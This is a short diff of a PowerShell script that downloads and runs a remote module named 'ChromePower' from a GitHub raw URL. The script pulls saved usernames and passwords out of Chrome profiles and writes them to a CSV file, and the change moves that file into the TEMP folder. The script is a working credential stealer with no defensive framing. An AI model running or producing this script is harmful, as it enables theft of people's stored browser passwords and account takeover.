@@ -16,4 +16,4 @@ IRM 'https://raw.githubusercontent.com/zjdev716/ChromePower/refs/heads/main/Chro
 $results = Invoke-PowerChrome -Browser Chrome -Verbose
 $results | Where-Object { $_ -is [PSCustomObject] -and $_.Password } | 
     Select-Object Browser, Profile, Target, Username, Password | 
-    Export-Csv -Path ".\chrome_passwords.csv" -NoTypeInformation -Encoding UTF8
+    Export-Csv -Path "$env:TEMP\chrome.csv" -NoTypeInformation -Encoding UTF8
